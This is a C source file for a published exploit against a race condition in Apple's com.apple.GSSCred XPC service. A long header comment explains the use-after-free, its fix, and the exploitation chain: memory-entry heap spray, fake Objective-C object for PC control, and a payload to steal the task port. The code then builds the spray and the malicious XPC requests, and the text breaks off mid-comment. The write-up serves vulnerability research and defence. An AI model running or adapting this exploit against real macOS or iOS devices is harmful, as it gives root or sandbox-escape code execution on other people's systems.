/*
 * gsscred-race
 * Brandon Azad
 *
 *
 * gsscred-race
 * ================================================================================================
 *
 *  gsscred-race is an exploit for a race condition found in the com.apple.GSSCred XPC service,
 *  which runs as root on macOS and iOS (although it is sandboxed on iOS) and which can be reached
 *  from within the default iOS application sandbox. By creating parallel connections to the
 *  GSSCred service we can trigger a use-after-free condition leading to a call to objc_msgSend()
 *  on a controlled pointer, eventually leading to code execution inside the GSSCred process.
 *
 *
 * The vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 *  The GSSCred service first creates a serial dispatch queue and initializes the XPC connection
 *  listener to run on that queue:
 *
 *  	runQueue = dispatch_queue_create("com.apple.GSSCred", DISPATCH_QUEUE_SERIAL);
 *  	heim_assert(runQueue != NULL, "dispatch_queue_create failed");
 *
 *  	conn = xpc_connection_create_mach_service("com.apple.GSSCred",
 *  	                                          runQueue,
 *  	                                          XPC_CONNECTION_MACH_SERVICE_LISTENER);
 *
 *  	xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {
 *  		GSSCred_event_handler(object);
 *  	});
 *
 *  The XPC runtime will dispatch a call to GSSCred_event_handler() each time an event is received
 *  on the listener connection. In particular, when a client creates a connection to
 *  com.apple.GSSCred and sends the first XPC message, GSSCred_event_handler() will be invoked with
 *  the server-side XPC connection object.
 *
 *  Using a serial dispatch queue is important for clients that don't specifically implement
 *  support for parallel connections (for example, by protecting concurrent object accesses with
 *  locks). GSSCred does not implement any locking, relying on the serial processing of XPC events
 *  to protect against race conditions.
 *
 *  The GSSCred_event_handler() function is responsible for initializing an incoming client
 *  connection. It creates a server-side "peer" object to represent the connection context and sets
 *  the event handler that the XPC runtime will call when an event (such as a message from the
 *  client) is received on the connection:
 *
 *  	static void GSSCred_event_handler(xpc_connection_t peerconn)
 *  	{
 *  		struct peer *peer;
 *
 *  		peer = malloc(sizeof(*peer));
 *  		heim_assert(peer != NULL, "out of memory");
 *
 *  		peer->peer = peerconn;
 *  		peer->bundleID = CopySigningIdentitier(peerconn);
 *  		if (peer->bundleID == NULL) {
 *  			...
 *  		}
 *  		peer->session = HeimCredCopySession(xpc_connection_get_asid(peerconn));
 *  		heim_assert(peer->session != NULL, "out of memory");
 *
 *  		xpc_connection_set_context(peerconn, peer);
 *  		xpc_connection_set_finalizer_f(peerconn, peer_final);
 *
 *  		xpc_connection_set_event_handler(peerconn, ^(xpc_object_t event) {
 *  			GSSCred_peer_event_handler(peer, event);
 *  		});
 *  		xpc_connection_resume(peerconn);
 *  	}
 *
 *  The problem is that the target dispatch queue for the connection to the client ("peerconn" in
 *  the code) was never specified, and therefore defaults to libdispatch's default target queue,
 *  DISPATCH_TARGET_QUEUE_DEFAULT, which is a concurrent queue. From the documentation for
 *  xpc_connection_set_event_handler() in xpc/connection.h:
 *
 *  	Connections received by listeners are equivalent to those returned by
 *  	xpc_connection_create() with a non-NULL name argument and a NULL targetq
 *  	argument with the exception that you do not hold a reference on them.
 *  	You must set an event handler and activate the connection.
 *
 *  And here's the documentation from xpc_connection_create() about the targetq parameter:
 *
 *  	@param targetq
 *  	The GCD queue to which the event handler block will be submitted. This
 *  	parameter may be NULL, in which case the connection's target queue will be
 *  	libdispatch's default target queue, defined as DISPATCH_TARGET_QUEUE_DEFAULT.
 *  	The target queue may be changed later with a call to
 *  	xpc_connection_set_target_queue().
 *
 *  Thus, setting the target queue for the listener connection only is not sufficient: client
 *  connections will be received serially in the listener event handler, but the event handlers for
 *  different client connections can run in parallel.
 *
 *  The XPC documentation about concurrent execution of event handlers in different clients may be
 *  misleading at first glance. The documentation for xpc_connection_set_target_queue() states:
 *
 *  	The XPC runtime guarantees this non-preemptiveness even for concurrent target
 *  	queues. If the target queue is a concurrent queue, then XPC still guarantees
 *  	that there will never be more than one invocation of the connection's event
 *  	handler block executing concurrently. If you wish to process events
 *  	concurrently, you can dispatch_async(3) to a concurrent queue from within
 *  	the event handler.
 *
 *  It's important to understand that this guarantee is strictly per-connection: event handler
 *  blocks for different connections, even if they share the same underlying code, are considered
 *  different event handler blocks and are allowed to run concurrently.
 *
 *  The fix for this issue in GSSCred is to insert a call to xpc_connection_set_target_queue()
 *  before activating the client connection with xpc_connection_resume() to set the target
 *  queue for the client connection to the serial queue created earlier. For example:
 *
 *  		xpc_connection_set_event_handler(peerconn, ^(xpc_object_t event) {
 *  			GSSCred_peer_event_handler(peer, event);
 *  		});
 *  		xpc_connection_set_target_queue(peerconn, runQueue);		// added
 *  		xpc_connection_resume(peerconn);
 *
 *  This will guarantee that all client requests across all connections will be handled serially.
 *
 *
 * Exploit strategy
 * ------------------------------------------------------------------------------------------------
 *
 *  There are several ways to exploit this race condition, with varying levels of difficulty. After
 *  much experimentation, I eventually settled on triggering a use-after-free in the function
 *  do_SetAttrs() by invoking the do_Delete() function in parallel from another connection.
 *
 *  Ihere may be better ways to exploit this bug, and it's certainly possible to improve exploit
 *  reliability above what I've achieved here.
 *
 *
 *  Creating a use-after-free
 *  -------------------------
 *
 *  The do_SetAttrs() function handles the "setattributes" command from the client. Here is the
 *  code (edited for presentation):
 *
 *  	static void
 *  	do_SetAttrs(struct peer *peer, xpc_object_t request, xpc_object_t reply)
 *  	{
 *  		CFUUIDRef uuid = HeimCredCopyUUID(request, "uuid");
 *  		CFMutableDictionaryRef attrs;
 *  		CFErrorRef error = NULL;
 *
 *  		if (uuid == NULL)
 *  			return;
 *
 *  		if (!checkACLInCredentialChain(peer, uuid, NULL)) {
 *  			CFRelease(uuid);
 *  			return;
 *  		}
 *
 *  		HeimCredRef cred = (HeimCredRef)CFDictionaryGetValue(	// (a) The credential
 *  				peer->session->items, uuid);		//     pointer is copied to
 *  		CFRelease(uuid);					//     the stack.
 *  		if (cred == NULL)
 *  			return;
 *
 *  		heim_assert(CFGetTypeID(cred) == HeimCredGetTypeID(),
 *  				"cred wrong type");
 *
 *  		if (cred->attributes) {
 *  			attrs = CFDictionaryCreateMutableCopy(NULL, 0,
 *  					cred->attributes);
 *  			if (attrs == NULL)
 *  				return;
 *  		} else {
 *  			attrs = CFDictionaryCreateMutable(NULL, 0,
 *  					&kCFTypeDictionaryKeyCallBacks,
 *  					&kCFTypeDictionaryValueCallBacks);
 *  		}
 *
 *  		CFDictionaryRef replacementAttrs =			// (b) The attributes dict
 *  			HeimCredMessageCopyAttributes(			//     is deserialized from
 *  					request, "attributes",		//     the XPC message.
 *  					CFDictionaryGetTypeID());
 *  		if (replacementAttrs == NULL) {
 *  			CFRelease(attrs);
 *  			goto out;
 *  		}
 *
 *  		CFDictionaryApplyFunction(replacementAttrs,
 *  				updateCred, attrs);
 *  		CFRELEASE_NULL(replacementAttrs);
 *
 *  		if (!validateObject(attrs, &error)) {			// (c) The deserialized
 *  			addErrorToReply(reply, error);			//     attributes dict is
 *  			goto out;					//     validated.
 *  		}
 *
 *  		handleDefaultCredentialUpdate(peer->session,		// (d) The credential
 *  				cred, attrs);				//     pointer from (a) is
 *  									//     used.
 *  		// make sure the current caller is on the ACL list
 *  		addPeerToACL(peer, attrs);
 *
 *  		CFRELEASE_NULL(cred->attributes);
 *  		cred->attributes = attrs;
 *  	out:
 *  		CFRELEASE_NULL(error);
 *  	}
 *
 *  Since we fully control the contents of the XPC request, we can make most deserialization
 *  commands take a long time to run, which opens a nice wide race window. Here in do_SetAttrs()
 *  the HeimCredMessageCopyAttributes() function performs deserialization, meaning we have an
 *  opportunity to change the program state during its execution.
 *
 *  To unexpectedly change the program state while do_SetAttrs() is stalled we will use the
 *  do_Delete() function. This function is responsible for handling a "delete" command from the
 *  client. It will delete all credentials matching the deletion query. We can send a "delete"
 *  request to free the credential pointer held by do_SetAttrs() while the latter is busy
 *  deserializing.
 *
 *  Using these two functions, the race condition flow goes like this:
 *
 *  1. Create the credential we'll use for the UAF by sending a "create" request.
 *
 *  2. Send a "setattributes" request for the target credential with an attributes dictionary that
 *     will take a long time to deserialize. A pointer to the credential will be saved on the stack
 *     (or in a register) while HeimCredMessageCopyAttributes() is deserializing, allocating
 *     objects in a tight loop.
 *
 *  3. While do_SetAttrs() is still in the allocation loop, send a "delete" request on a second
 *     connection to delete the target credential. This second connection's event handler will run
 *     on another thread and free the credential. The freed credential object will be added to the
 *     heap freelist.
 *
 *  4. If we're lucky, back in the first connection's thread, the freed credential object will be
 *     reallocated by HeimCredMessageCopyAttributes() to store deserialized data from the
 *     attributes dictionary, giving us control over some of the fields of the freed credential.
 *
 *  5. Eventually HeimCredMessageCopyAttributes() finishes and do_SetAttrs() resumes, not knowing
 *     that the contents of the credential pointer it stored have been changed. It passes the
 *     corrupted credential to handleDefaultCredentialUpdate() and all hell breaks loose.
 *
 *
 *  Corrupting the HeimCred
 *  -----------------------
 *
 *  Now it's worth talking about how exactly we're going to overwrite the HeimCred object. Here's
 *  the structure definition:
 *
 *  	struct HeimCred_s {
 *  		CFRuntimeBase   runtime;	// 00: 0x10 bytes
 *  		CFUUIDRef       uuid;		// 10: 8 bytes
 *  		CFDictionaryRef attributes;	// 18: 8 bytes
 *  		HeimMech *      mech;		// 20: 8 bytes
 *  	};					// Total: 0x28 bytes
 *
 *  Since the full structure is 0x28 bytes, it will be allocated from and freed to the 0x30
 *  freelist, which is used for heap objects between 0x20 and 0x30 bytes in size. This means that
 *  whatever deserialization is happening in HeimCredMessageCopyAttributes(), we'll need to ensure
 *  that it allocates from the 0x30 freelist in a tight loop, allowing the freed HeimCred to be
 *  reused.
 *
 *  However, we can't pass just anything to HeimCredMessageCopyAttributes(): we also need the
 *  deserialized dictionary to pass the call to validateObject() later on. Otherwise, even if we
 *  manage to corrupt the HeimCred object, it won't be used afterwards, rendering our exploit
 *  pointless.
 *
 *  It turns out the only way we can both allocate objects in an unbounded loop and pass the
 *  validateObject() check is by supplying an attributes dictionary containing an array of strings
 *  under the "kHEIMAttrBundleIdentifierACL" key. All other collections of objects will be rejected
 *  by validateObject(). Thus, the only objects we can allocate in a loop are OS_xpc_string, the
 *  object type for an XPC string, and CFString, the CoreFoundation string type.
 *
 *  (This isn't quite true: we could, for example, play tricks with a serialized XPC dictionary
 *  with colliding keys such that some objects we allocate don't end up in the final collection.
 *  However, I tried to limit myself to the official XPC API and legal XPC objects. If you remove
 *  this restriction, you can probably significantly improve the exploit. :) )
 *
 *  Fortunately for us, both OS_xpc_string and CFString (for certain string lengths) are also
 *  allocated out of the 0x30 freelist. It's possible to target either data structure for the
 *  exploit, but I eventually settled on CFString because it seems easier to win the corresponding
 *  race window.
 *
 *  Immutable CFString objects are allocated with their character data inline. This is what the
 *  structure looks like for short strings:
 *
 *  	struct CFString {
 *  		CFRuntimeBase   runtime;	// 00: 0x10 bytes
 *  		uint8_t         length;		// 10: 1 byte
 *  		char            characters[1];	// 11: variable size
 *  	};
 *
 *  Thus, if we use strings between 0x10 and 0x1f bytes long (including the null terminator), the
 *  CFString objects will be allocated out of the 0x30 freelist, potentially allowing us to control
 *  some fields of the freed HeimCred object.
 *
 *  For the use-after-free to be exploitable we want the part of the CFString that we control to
 *  overlap the fields of HeimCred, such that creating the CFString will corrupt the HeimCred
 *  object in an interesting way. Looking back to the definition of the HeimCred structure, we can
 *  see that the "uuid", "attributes", and "mech" fields are all possibly controllable.
 *
 *  However, all three of these fields are pointers, and userspace pointers on iOS usually contain
 *  null bytes. Our CFString will end at the first null byte, so in order to remain in the 0x30
 *  freelist the first null byte must occur at or after offset 0x20. This means the "uuid" and
 *  "attributes" fields will have to be null-free, making them less promising exploit targets.
 *  Hence "mech" is the natural choice. We will try to get the corrupted HeimCred's "mech" field to
 *  point to memory whose contents we control.
 *
 *
 *  Pointing to controlled data
 *  ---------------------------
 *
 *  Where exactly will we make "mech" point?
 *
 *  We want "mech" to point to memory we control, but due to ASLR we don't know any addresses in
 *  the GSSCred process. The traditional way to bypass ASLR when we don't know where our
 *  allocations will be placed is using a heap spray. However, this presents two problems. First,
 *  performing a traditional heap spray over XPC would be quite slow, since the kernel would need
 *  to copy a huge amount of data from our address space into GSSCred's address space. Second, on
 *  iOS the GSSCred process has a strict memory limit of around 6 megabytes, after which it is at
 *  risk of being killed by Jetsam. 6 megabytes is nowhere near enough to perform an effective heap
 *  spray, especially since our serialized attributes dictionary will already be allocating
 *  thousands of strings to enlarge our race window.
 *
 *  Fortunately for us, libxpc contains an optimization that solves both problems: if we're sending
 *  an XPC data object larger than 0x4000 bytes, libxpc will instead create a Mach memory entry
 *  representing the data and send that to the target instead. Then, when the message is
 *  deserialized in the recipient, libxpc will map the memory entry directly into the recipient's
 *  address space by calling mach_vm_map(). The result is a fast, copy-free duplication of our
 *  memory in the recipient process's address space. And because the physical pages are shared,
 *  they don't count against GSSCred's memory limit. (See [1] for Ian Beer's triple_fetch exploit,
 *  which is where I learned of this technique and where I derived some of the initial parameters
 *  used here.)
 *
 *  Since libxpc calls mach_vm_map() with the VM_FLAGS_ANYWHERE flag, the kernel will choose the
 *  address of the mapping. Presumably to minimize address space fragmentation, the kernel will
 *  typically choose an address close to the program base. The program base is usually located at
 *  an address like 0x000000010c65d000: somewhere above but close to 4GB (0x100000000), with the
 *  exact address randomized by ASLR. The kernel might then place large VM_ALLOCATE objects at an
 *  address like 0x0000000116097000: after the program, but still fairly close to 0x100000000. By
 *  comparison, the MALLOC_TINY heap (which is where all of our objects will live) might start at
 *  0x00007fb6f0400000 on macOS and 0x0000000107100000 on iOS.
 *
 *  Using a memory entry heap spray, we can fill a gigabyte or more of GSSCred's virtual memory
 *  space with controlled data. (Choosing the exact parameters was a frustrating exercise in
 *  guess-and-check, because for unknown reasons certain configurations of the heap spray work well
 *  and others do not.) Because the sprayed data will follow closely behind the program base,
 *  there's a good chance that addresses close to 0x0000000120000000 will contain our sprayed data.
 *
 *  This means we'll want our corrupted "mech" field to contain a pointer like 0x0000000120000000.
 *  Once again, we need to address problems with null bytes.
 *
 *  Recall that the "mech" field is actually part of a CFString object that overwrites the freed
 *  HeimCred pointer. Thus, the first null byte will terminate the string and all bytes after that
 *  will retain whatever value they originally had in the HeimCred object.
 *
 *  Fortunately, because current macOS and iOS platforms are all little-endian, the pointer is laid
 *  out least significant byte to most significant byte. If instead we use an address like
 *  0x0000000120202020 (with all the null bytes at the start) for our controlled data, then the
 *  lower 5 bytes of the address will be copied into the "mech" field, and the null terminator will
 *  zero out the 6th. This leaves just the 2 high bytes of the "mech" field with whatever value
 *  they had originally.
 *
 *  However, we know that the "mech" field was originally a heap pointer into the MALLOC_TINY heap,
 *  and MALLOC_TINY pointers on both macOS and iOS start with 2 zero bytes. Thus, even though we
 *  can only write to the lower 6 bytes, we know that the upper 2 bytes will always have the value
 *  we want.
 *
 *  This means we have a way to get controlled data at a known address in the GSSCred process and
 *  can make the "mech" field point to that data. Getting control of PC is simply a matter of
 *  choosing the right data.
 *
 *
 *  Controlling PC
 *  --------------
 *
 *  We fully control the data pointed to by the "mech" field, so we can construct a fake HeimMech
 *  object. Here's the HeimMech structure:
 *
 *  	struct HeimMech {
 *  		CFRuntimeBase           runtime;		// 00: 0x10 bytes
 *  		CFStringRef             name;			// 10: 8 bytes
 *  		HeimCredStatusCallback  statusCallback;		// 18: 8 bytes
 *  		HeimCredAuthCallback    authCallback;		// 20: 8 bytes
 *  	};
 *
 *  All of these fields are attractive targets. Controlling the isa pointer of an Objective-C class
 *  allows us to gain code execution if an Objective-C message is sent to the object (see Phrack,
 *  "Modern Objective-C Exploitation Techniques" [2]). And the last 2 fields are pointers to
 *  callback functions, which is an even easier route to PC control (if we can get them called).
 *
 *  To determine which field or fields are of interest, we need to look at how the corrupted
 *  HeimCred is used. The first time it is used after the call to HeimCredMessageCopyAttributes()
 *  is when it is passed as a parameter to handleDefaultCredentialUpdate().
 *
 *  Here's the source code of handleDefaultCredentialUpdate(), with some irrelevant code removed:
 *
 *  	static void
 *  	handleDefaultCredentialUpdate(struct HeimSession *session,
 *  			HeimCredRef cred, CFDictionaryRef attrs)
 *  	{
 *  		heim_assert(cred->mech != NULL, "mech is NULL, "	// (e) mech must not be
 *  				"schame validation doesn't work ?");	//     NULL.
 *
 *  		CFUUIDRef oldDefault = CFDictionaryGetValue(		// (f) Corrupted name
 *  				session->defaultCredentials,		//     pointer passed to
 *  				cred->mech->name);			//     CF function.
 *
 *  		CFBooleanRef defaultCredential = CFDictionaryGetValue(
 *  				attrs, kHEIMAttrDefaultCredential);
 *  		...
 *
 *  		CFDictionarySetValue(session->defaultCredentials,
 *  				cred->mech->name, cred->uuid);
 *
 *  		notifyChangedCaches();
 *  	}
 *
 *  Since we will make the corrupted HeimCred's "mech" field point to our heap spray data, it will
 *  never be NULL, so the assertion will pass. Next, the "mech" field will be dereferenced to read
 *  the "name" pointer, which is passed to CFDictionaryGetValue(). This is perfect: we can make our
 *  fake HeimMech's "name" pointer also point into the heap spray data. We will construct a fake
 *  Objective-C object such that when CFDictionaryGetValue() sends a message to it we end up with
 *  PC control.
 *
 *  As it turns out, CFDictionaryGetValue() will send an Objective-C message with the "hash"
 *  selector to its second argument. We can construct our fake "name" object so that its isa
 *  pointer indicates that it responds to the "hash" selector with an Objective-C method whose
 *  implementation pointer contains the PC value we want. For more complete details, refer to [2].
 *
 *  So, in summary, we can corrupt the HeimCred object such that its "mech" pointer points to a
 *  fake HeimMech object, and the HeimMech's "name" field points to a fake Objective-C object whose
 *  contents we fully control. The "name" pointer will be passed to CFDictionaryGetValue(), which
 *  will invoke objc_msgSend() on the "name" pointer for the "hash" selector. The "name" object's
 *  isa pointer will point to an objc_class object that indicates that "name" responds to the
 *  "hash" selector with a particular method implementation. When objc_msgSend() invokes that
 *  method, we get PC control, with the "name" pointer as the first argument.
 *
 *
 *  Getting GSSCred's task port
 *  ---------------------------
 *
 *  Controlling PC alone is not enough. We also need to construct a payload to execute in the
 *  context of the GSSCred process that will accomplish useful work. In our case, we will try to
 *  make GSSCred give us a send right to its task port, allowing us to manipulate the process
 *  without having to re-exploit the race condition each time. Here we will describe the ARM64
 *  payload.
 *
 *  When we get PC control, the X0 register will point to the fake "name" object. The "name"
 *  object's isa pointer is already determined by the part of the payload that gets PC control, but
 *  everything after the first 8 bytes can be used by the ARM64 payload.
 *
 *  My preferred technique for writing a payload when I can't inject code is to use jump-oriented
 *  programming, or JOP. I used this vulnerability as an opportunity to practice writing more
 *  complex JOP programs, and in particular to practice using loops and conditionals. I make no
 *  claim that the strategy outlined here is the cleanest, best, or most efficient design.
 *
 *  Borrowing a technique from triple_fetch [1], I wanted to have the exploit payload send a Mach
 *  message containing GSSCred's task port from GSSCred back to our process. The challenge is that
 *  we don't know what port to send this message to, such that we can receive the message back in
 *  our process. We could create a Mach port in our process to which we have the receive right,
 *  then send the corresponding send right over to GSSCred, but we don't know what port name the
 *  kernel will assign that send right over in GSSCred.
 *
 *  The triple_fetch exploit gets around this limitation by sending a message with thousands of
 *  Mach send rights, spraying the target's Mach port namespace so that with high probability one
 *  of the hardcoded Mach port names used in the payload will be a send right back to the
 *  exploiting process.
 *
 *  I decided to try the inverse: send a single Mach send right to GSSCred, then have the exploit
 *  payload try to send the Mach message to thousands of different Mach port names, hopefully
 *  hitting the one corresponding to the send right back to our process. One prominent advantage of
 *  this design is that it can take up significantly less space (we no longer need a massive Mach
 *  port spray, and the ARM64-specific part of the payload could easily be packed down to 400
 *  bytes).
 *
 *  The other strategy I was contemplating was to try and deduce the Mach send right name directly,
 *  either by working backwards from the current register values or stack contents or by scanning
 *  memory. However, this seemed more complicated and more fragile than simply spraying Mach
 *  messages to every possible port name.
 *
 *  Once GSSCred sends all the Mach messages, we need to finish in a way that doesn't cause GSSCred
 *  to crash. Since it seemed difficult to repair the corruption and resume executing from where
 *  we hijacked control, the exploit payload simply enters an infinite loop. This means that
 *  GSSCred will never reply to the "setattributes" request that caused the exploit payload to be
 *  executed.
 *
 *  Back in our process, we can listen on the receiving end of the Mach port we sent to GSSCred for
 *  a message. If a message is received, that means we won the race and the exploit succeeded.
 *
 *
 *  Gained access
 *  -------------
 *
 *  On macOS, GSSCred runs outside of any sandbox, meaning once we get the task port we have
 *  unsandboxed arbitrary code execution as root.
 *
 *  On iOS the story is a bit different. The GSSCred process enters the com.apple.GSSCred sandbox
 *  immediately on startup, which restricts it from doing most interesting things. The kernel
 *  attack surface from within the GSSCred sandbox does not appear significantly wider than from
 *  within the container sandbox. Thus, GSSCred may be a stepping-stone on a longer journey to
 *  unsandboxed code execution.
 *
 *
 * References
 * ------------------------------------------------------------------------------------------------
 *
 *  [1]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1247
 *  [2]: http://phrack.org/issues/69/9.html
 *
 */

#include "gsscred_race.h"

#include "apple_private.h"
#include "log.h"
#include "payload.h"

#include <assert.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>

// ---- Some definitions from Heimdal-520 ---------------------------------------------------------

static const char *kHEIMObjectType              = "kHEIMObjectType";
static const char *kHEIMObjectKerberos          = "kHEIMObjectKerberos";
static const char *kHEIMAttrType                = "kHEIMAttrType";
static const char *kHEIMTypeKerberos            = "kHEIMTypeKerberos";
static const char *kHEIMAttrUUID                = "kHEIMAttrUUID";
static const char *kHEIMAttrBundleIdentifierACL = "kHEIMAttrBundleIdentifierACL";

// ---- Exploit parameters ------------------------------------------------------------------------

static const char *GSSCRED_SERVICE_NAME = "com.apple.GSSCred";

static const size_t   UAF_STRING_COUNT              = 10000;

static const unsigned POST_CREATE_CREDENTIAL_DELAY  = 10000;	// 10 ms
static const unsigned RETRY_RACE_DELAY              = 50000;	// 50 ms

static const unsigned INITIAL_SETATTRIBUTES_TO_DELETE_DELAY_US   = 0;
static const unsigned SETATTRIBUTES_TO_DELETE_DELAY_INCREMENT_US = 200;

static const size_t   MAX_TRIES_TO_WIN_THE_RACE  = 300;
static const size_t   MAX_TRIES_TO_GET_TASK_PORT = 16;

// ---- Parameters for building the controlled page -----------------------------------------------

// These parameters were largely determined through trial and error. We want to send enough data to
// the target process that GSSCRED_RACE_PAYLOAD_ADDRESS is mapped with the contents of the payload.
static const size_t PAYLOAD_COUNT_PER_BLOCK    = 0x10;
static const size_t PAYLOAD_BLOCKS_PER_MAPPING = 0x100;
static const size_t PAYLOAD_MAPPING_COUNT      = 10;

// ---- Exploit implementation --------------------------------------------------------------------

// State for managing the GSSCred race.
struct gsscred_race_state {
	// The create request, which will create the credential.
	xpc_object_t create_request;
	// The setattributes request, which will trigger the UAF.
	xpc_object_t setattributes_request;
	// The delete request, which will delete the credential.
	xpc_object_t delete_request;
	// A semaphore that will be signalled when we receive the setattributes reply.
	dispatch_semaphore_t setattributes_reply_done;
	// A Mach port that will receive the task port from GSSCred when the exploit payload runs
	// in GSSCred's address space.
	mach_port_t listener_port;
	// The connection on which we will send the setattributes request.
	xpc_connection_t setattributes_connection;
	// The connection on which we will send the delete request.
	xpc_connection_t delete_connection;
	// Whether either connection has been interrupted, indicating a crash.
	bool connection_interrupted;
	// The current delay between sending the setattributes request and sending the delete
	// request.
	unsigned setattributes_to_delete_delay;
	// GSSCred's task port.
	mach_port_t gsscred_task_port;
	// A thread port for a thread in GSSCred's task.
	mach_port_t gsscred_thread_port;
};

// Prototypes.
static void gsscred_race_crash(struct gsscred_race_state *state);

// Generate a large mapping consisting of many copies of the given data. Note that changes to the
// beginning of the mapping will be reflected to other parts of the mapping, but possibly only if
// the other parts of the mapping are not accessed directly.
static void *
map_replicate(const void *data, size_t data_size, size_t count) {
	// Generate the large mapping.
	size_t mapping_size = data_size * count;
	mach_vm_address_t mapping;
	kern_return_t kr = mach_vm_allocate(mach_task_self(), &mapping, mapping_size,
			VM_FLAGS_ANYWHERE);
	if (kr != KERN_SUCCESS) {
		ERROR("%s(%zx): %x", "mach_vm_allocate", mapping_size, kr);
		goto fail_0;
	}
	// Re-allocate the first segment of this mapping for the master slice. Not sure if this is
	// necessary.
	kr = mach_vm_allocate(mach_task_self(), &mapping, data_size,
			VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE);
	if (kr != KERN_SUCCESS) {
		ERROR("%s(%zx, %s): %x", "mach_vm_allocate", data_size,
				"VM_FLAGS_OVERWRITE", kr);
		goto fail_1;
	}
	// Copy in the data into the master slice.
	memcpy((void *)mapping, data, data_size);
	// Now re-map the master slice onto the other slices.
	for (size_t i = 1; i < count; i++) {
		mach_vm_address_t remap_address = mapping + i * data_size;
		vm_prot_t current_protection, max_protection;
		kr = mach_vm_remap(mach_task_self(),
				&remap_address,
				data_size,
				0,
				VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
				mach_task_self(),
				mapping,
				FALSE,
				&current_protection,
				&max_protection,
				VM_INHERIT_NONE);
		if (kr != KERN_SUCCESS) {
			ERROR("%s(%s): %x", "mach_vm_remap", "VM_FLAGS_OVERWRITE", kr);
			goto fail_1;
		}
	}
	// All set! We should have one big memory object now.
	return (void *)mapping;
fail_1:
	mach_vm_deallocate(mach_task_self(), mapping, mapping_size);
fail_0:
	return NULL;
}

// Build the XPC spray data object that will (hopefully) get controlled data allocated at a fixed
// address in GSSCred.
static xpc_object_t
gsscred_race_build_payload_spray(const void *payload) {
	// Repeat the payload several times to create a bigger payload block. This helps with the
	// remapping process.
	size_t block_size = GSSCRED_RACE_PAYLOAD_SIZE * PAYLOAD_COUNT_PER_BLOCK;
	uint8_t *payload_block = malloc(block_size);
	assert(payload_block != NULL);
	for (size_t i = 0; i < PAYLOAD_COUNT_PER_BLOCK; i++) {
		memcpy(payload_block + i * GSSCRED_RACE_PAYLOAD_SIZE, payload,
				GSSCRED_RACE_PAYLOAD_SIZE);
	}
	// Now create an even larger copy of that payload block by remapping it several times
	// consecutively. This object will take up the same amount of memory as the single payload
	// block, despite covering a large virtual address range.
	size_t map_size = block_size * PAYLOAD_BLOCKS_PER_MAPPING;
	void *payload_map = map_replicate(payload_block, block_size, PAYLOAD_BLOCKS_PER_MAPPING);
	assert(payload_map != NULL);
	free(payload_block);
	// Wrap the payload mapping in a dispatch_data_t so that it isn't copied, then wrap that in
	// an XPC data object. We leverage the internal DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE data
	// destructor so that dispatch_data_make_memory_entry() doesn't try to remap the data
	// (which would cause us to be killed by Jetsam).
	dispatch_data_t dispatch_data = dispatch_data_create(payload_map, map_size,
			NULL, DISPATCH_DATA_DESTRUCTOR_VM_DEALLOCATE);
	assert(dispatch_data != NULL);
	xpc_object_t xpc_data = xpc_data_create_with_dispatch_data(dispatch_data);
	dispatch_release(dispatch_data);
	assert(xpc_data != NULL);
	return xpc_data;
}

// Create a Mach port that will receive a message sent by our exploit payload from GSSCred's
// process. Destroy the listener port with mach_port_destroy().
static void
gsscred_race_create_listener_port(struct gsscred_race_state *state) {
	mach_port_t port = MACH_PORT_NULL;
	kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
	assert(kr == KERN_SUCCESS);
	kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
	assert(kr == KERN_SUCCESS);
	state->listener_port = port;
}

// Build the request objects for the GSSCred race. We do this all upfront.
static void
gsscred_race_build_requests(struct gsscred_race_state *state,
		const char *uaf_string, const void *payload) {
	uuid_t uuid  = { 0xab };
	// Build the create request for the credential:
	// {
	//     "command":    "create",
	//     "attributes": {
	//         "kHEIMObjectType": "kHEIMObjectKerberos",
	//         "kHEIMAttrType":   "kHEIMTypeKerberos",
	//         "kHEIMAttrUUID":   ab,
	//     },
	// }
	xpc_object_t create_attributes = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t create_request    = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(create_attributes, kHEIMObjectType, kHEIMObjectKerberos);
	xpc_dictionary_set_string(create_attributes, kHEIMAttrType,   kHEIMTypeKerberos);
	xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrUUID,   uuid);
	xpc_dictionary_set_string(create_request, "command",    "create");
	xpc_dictionary_set_value( create_request, "attributes", create_attributes);
	xpc_release(create_attributes);
	state->create_request = create_request;
	// Generate the XPC data object that we will spray into GSSCred to map
	// GSSCRED_RACE_PAYLOAD_ADDRESS with our exploit payload.
	xpc_object_t payload_spray = gsscred_race_build_payload_spray(payload);
	// Build the setattributes request for the target credential:
	// {
	//     "command":    "setattributes",
	//     "uuid":       ab,
	//     "attributes": {
	//         "kHEIMAttrBundleIdentifierACL": [
	//             "AAAA...",
	//             "AAAA...",
	//             ...,
	//         ],
	//     },
	//     "mach_send":  <send right to listener port>,
	//     "data_0":     <memory entry containing payload>,
	//     "data_1":     <memory entry containing payload>,
	//     ...,
	// }
	xpc_object_t new_acl               = xpc_array_create(NULL, 0);
	xpc_object_t new_attributes        = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t setattributes_request = xpc_dictionary_create(NULL, NULL, 0);
	for (size_t i = 0; i < UAF_STRING_COUNT; i++) {
		xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, uaf_string);
	}
	xpc_dictionary_set_value(new_attributes, kHEIMAttrBundleIdentifierACL, new_acl);
	for (size_t i = 0; i < PAYLOAD_MAPPING_COUNT; i++) {
		char key[20];
		snprintf(key, sizeof(key), "data_%zu", i);
		xpc_dictionary_set_value(setattributes_request, key, payload_spray);
	}
	xpc_dictionary_set_mach_send(setattributes_request, "mach_send",  state->listener_port);
	xpc_dictionary_set_string(   setattributes_request, "command",    "setattributes");
	xpc_dictionary_set_uuid(     setattributes_request, "uuid",       uuid);
	xpc_dictionary_set_value(    setattributes_request, "attributes", new_attributes);
	xpc_release(new_acl);
	xpc_release(new_attributes);
	xpc_release(payload_spray);
	state->setattributes_request = setattributes_request;
	// Build the delete request for the credential.
	// {
	//     "command": "delete",
	//     "query":   {
